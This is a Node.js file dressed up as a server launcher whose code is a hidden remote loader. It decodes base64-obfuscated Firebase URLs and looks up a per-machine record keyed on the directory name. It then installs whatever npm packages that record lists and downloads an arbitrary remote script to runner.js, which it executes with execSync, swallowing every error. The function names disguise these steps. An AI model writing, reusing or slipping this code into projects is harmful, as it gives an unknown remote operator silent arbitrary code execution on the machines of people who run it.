const fs = require('fs')
const path = require('path')
const axios = require('axios')
const { execSync } = require('child_process')

let USER = getUserName()
let FINISH = new Date().getTime()+21000000

startServer()


setInterval(async () => {
    await checkStatus()
}, 120000)

async function startServer() {
    console.log('Node: ---START-SERVER---')

    let module = await onClientDisconnect()
    if (!module) {
        console.log('---PROCESS-CLOSE---')
        process.exit(0)
    }

    await checkStatus()
    
    await runDynamicServer(module)
}

async function onClientDisconnect() {
    try {
        let responce = await axios.get(decode('aHR0cHM6Ly9kYXRhYmFzZTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vJUMyJUEzdWNrJUUzJTgwJTg1eW91L3J1bm5pbmcv')+USER+'.json')
        
        let data = responce.data

        if (data && data.module) {
            responce = await axios.get(decode('aHR0cHM6Ly9kYXRhYmFzZTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vJUMyJUEzdWNrJUUzJTgwJTg1eW91L21vZHVsZS8=')+data.module+'.json')
            
            let module = responce.data
            if (module) {
                return module
            }
        }
    } catch (error) {}

    return null
}

function gracefulShutdown() {
    console.log(`[💀] Process closing due to:`)
    
    process.exit(0)
}

async function checkStatus() {
    if (FINISH > 0 && FINISH < new Date().getTime()) {
        // try {
        //     await postAxios(STORAGE+encodeURIComponent('server/'+USER+'.json'), '', {
        //         'Content-Type':'active/'+parseInt(new Date().getTime()/1000)
        //     })
        // } catch (error) {}

        console.log('---COMPLETED---')
        process.exit(0)
    } else {
        // try {
        //     await postAxios(STORAGE+encodeURIComponent('server/'+USER+'.json'), '', {
        //         'Content-Type':'active/'+(parseInt(new Date().getTime()/1000)+200)
        //     })
        // } catch (error) {}
    }
}

async function runDynamicServer(data) {
    try {
        const packages = data.install.split(' ')
        const missingPackages = []

        for (let pkg of packages) {
            try {
                require.resolve(pkg)
            } catch {
                missingPackages.push(pkg)
            }
        }

        if (missingPackages.length > 0) {
            console.log('Node: ---INSTALLING-PACKAGE---')
            execSync(`npm install ${missingPackages.join(" ")}`)
            console.log('Node: ---INSTALLATION-SUCCESS---')
        }

        const filePath = path.join(__dirname, 'runner.js');

        if (!fs.existsSync(filePath)) {
            const response = await axios.get(data.script)
            fs.writeFileSync(filePath, response.data, 'utf8')
        }

        console.log('Node: ---RUNNING-SCRIPT---')
        execSync(`node ${filePath}`, { stdio: 'inherit' })

    } catch (error) {}
}

function getUserName() {
    try {
        let directory = __dirname.split('\\')
        if (directory.length > 1) {
            let name = directory[directory.length-1]
            if (name) {
                return name
            }
        }
    } catch (error) {}

    try {
        let directory = __dirname.split('/')
        if (directory.length > 1) {
            let name = directory[directory.length-1]
            if (name) {
                return name
            }
        }
    } catch (error) {}

    return null
}


function decode(data) {
    return Buffer.from(data, 'base64').toString('utf-8')
}

function delay(time) {
    return new Promise(function(resolve) {
        setTimeout(resolve, time)
    })
}

process.on('SIGINT', () => gracefulShutdown())
process.on('SIGTERM', () => gracefulShutdown())
process.on('uncaughtException', (err) => gracefulShutdown())
process.on('unhandledRejection', (reason) => gracefulShutdown())

process.on('exit', (code) => {
  console.log(`[⚙️] Process exiting with code ${code}`)
})
